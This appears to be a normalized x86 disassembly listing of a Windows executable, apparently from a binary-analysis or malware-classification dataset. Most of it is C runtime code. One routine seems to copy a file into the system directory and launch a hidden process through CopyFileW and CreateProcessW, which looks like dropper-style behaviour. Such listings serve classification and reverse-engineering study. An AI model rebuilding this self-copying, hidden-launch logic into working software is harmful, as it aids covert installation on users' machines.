add esp 0x4
sub_4053dc
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40a4e5
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_40a4e5
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_40548d
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_405547
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40559b
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_401c91
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_405719
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_401436
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_405770
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x31 ] 0x0
push edi
mov ebx ecx
mov edi esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
push eax
mov ecx ebx
call sub_405770
cmp [ esi + 0x20 ] 0x10
mov edi [ edi ]
jb r-xdata
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
push esi
mov [ esi + 0xc ] 0x0
call sub_408b16
add esp 0x4
cmp [ edi + 0x31 ] 0x0
mov esi edi
je r-xdata
mov ecx [ esi + 0xc ]
push ecx
call sub_408b16
add esp 0x4
sub_4057cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_401400
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_405e78 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_40cb11
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_405fe5
mov eax [ rw-data ]
xor edx edx
test eax eax
jne r-xdata
movzx ecx [ eax ]
cmp ecx 0x20
ja r-xdata
mov eax r--data
cmp ecx 0x22
jne r-xdata
test cx cx
je r-xdata
add eax 0x2
jmp r-xdata
xor ecx ecx
test edx edx
sete cl
mov edx ecx
retn
test edx edx
je r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx 0x20
ja r-xdata
add eax 0x2
sub_406030
push ebp
mov ebp esp
push 0xffffffff
push sub_4164b5
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
xor ebx ebx
jmp r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
cmp esi edi
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_408b16
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
lea edx [ eax + eax + 0x2 ]
push edx
push edi
push esi
call sub_4138f0
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
sub_406100
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_40eab5
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
lea ecx [ edi + ebx ]
or eax 0xffffffff
call sub_40cda0
mov eax ebx
xor ecx ecx
call sub_40cda0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_40458d
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
push esi
call sub_40a640
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push edi
add ecx ebx
push ecx
push eax
call sub_415340
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_4061d8
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_406230
push ebp
mov ebp esp
mov eax 0x1724
call sub_4148b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x104
lea eax [ ebp - 0x678 ]
mov ebx ecx
push eax
mov [ ebp - 0x16c0 ] ebx
call [ GetSystemDirectoryW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x678 ]
push ecx
mov edx 0x7ffffffe
mov eax 0x106
lea ecx [ ebp - 0x260 ]
call sub_413550
test eax eax
jne r-xdata
lea edx [ ebp - 0x260 ]
push edx
call [ PathAddBackslashW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xa
call sub_40c700
mov eax edx
push eax
mov eax 0x20c
lea edi [ ebp - 0x260 ]
call sub_404b10
test eax eax
jne r-xdata
mov ecx edi
push ecx
call [ PathFileExistsW@IAT ]
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0x16c4 ]
mov eax 0x2
call sub_40c700
lea edx [ ebp - 0x16bc ]
mov eax 0x20
call sub_40c700
mov eax [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
sub edx eax
sar edx 0x2
xor esi esi
test edx edx
je r-xdata
mov ebx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
push 0x1
push eax
lea ecx [ ebp - 0x260 ]
push ecx
call [ CopyFileW@IAT ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov edx 0x7ffffffe
mov eax 0x106
lea ecx [ ebp - 0x260 ]
call sub_413550
test eax eax
jne r-xdata
mov edi [ PathQuoteSpacesW@IAT ]
lea edx [ ebp - 0x260 ]
push edx
call edi
mov eax [ ebx ]
push eax
mov edx 0x7ffffffe
mov eax 0x106
lea ecx [ ebp - 0x470 ]
call sub_413550
test eax eax
jne r-xdata
lea eax [ ebp - 0x470 ]
push eax
call edi
lea ecx [ ebp - 0x260 ]
push ecx
mov edx 0x7ffffffe
mov eax 0x820
lea ecx [ ebp - 0x16b8 ]
call sub_413550
test eax eax
jne r-xdata
lea edx [ ebp - 0x16bc ]
push edx
mov eax 0x1040
lea edi [ ebp - 0x16b8 ]
call sub_404b10
test eax eax
jne r-xdata
lea eax [ ebp - 0x470 ]
push eax
mov eax 0x1040
call sub_404b10
test eax eax
jne r-xdata
lea ecx [ ebp - 0x16c4 ]
push ecx
mov eax 0x1040
call sub_404b10
test eax eax
jne r-xdata
lea edx [ ebp - 0x16bc ]
push edx
mov eax 0x1040
call sub_404b10
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax 0x1040
call sub_404b10
test eax eax
jne r-xdata
mov ebx [ ebp - 0x16c0 ]
cmp [ ebx ] eax
je r-xdata
mov edi [ GetCommandLineW@IAT ]
call edi
test eax eax
je r-xdata
lea ecx [ ebp - 0x16bc ]
push ecx
mov eax 0x1040
call sub_404b10
test eax eax
jne r-xdata
push 0x44
lea eax [ ebp - 0x1720 ]
push 0x0
push eax
call sub_413e10
add esp 0xc
xor eax eax
lea ecx [ ebp - 0x16d4 ]
push ecx
lea edx [ ebp - 0x1720 ]
push edx
push eax
push eax
push 0x8000000
push eax
push eax
push eax
mov [ ebp - 0x16d4 ] eax
mov [ ebp - 0x16d0 ] eax
mov [ ebp - 0x16cc ] eax
mov [ ebp - 0x16c8 ] eax
lea eax [ ebp - 0x16b8 ]
push eax
push 0x0
mov [ ebp - 0x1720 ] 0x44
call [ CreateProcessW@IAT ]
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
sub ecx eax
inc esi
sar ecx 0x2
cmp esi ecx
jb r-xdata
call edi
lea edx [ eax + 0x2 ]
lea edx [ ebp - 0x18 ]
mov eax 0x1f
call sub_40c700
push edx
mov eax 0x1040
call sub_404b10
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea edx [ ebp - 0xc ]
mov eax 0x4
call sub_40c700
call [ GetCurrentProcessId@IAT ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax 0x16
lea ebx [ ebp - 0x30 ]
call sub_40e8c0
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x16bc ]
push edx
mov eax 0x1040
lea edi [ ebp - 0x16b8 ]
call sub_404b10
test eax eax
jne r-xdata
mov ecx ebx
push ecx
mov eax 0x1040
call sub_404b10
test eax eax
jne r-xdata
call [ GetCommandLineW@IAT ]
push eax
mov eax 0x1040
call sub_404b10
test eax eax
jne r-xdata
mov ebx [ ebp - 0x16c0 ]
sub_4065a0
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
xor edi edi
mov [ esi + 0xda0 ] edi
mov [ esi + 0xda4 ] edi
mov [ esi + 0xda8 ] edi
push 0x11c
mov [ esi + 0xdb0 ] edi
mov [ esi + 0xdb4 ] edi
mov [ esi + 0xdb8 ] edi
lea ebx [ esi + 0x4 ]
push edi
push ebx
mov [ esi + 0xdc0 ] edi
mov [ esi + 0xdc4 ] edi
call sub_413e10
add esp 0xc
push ebx
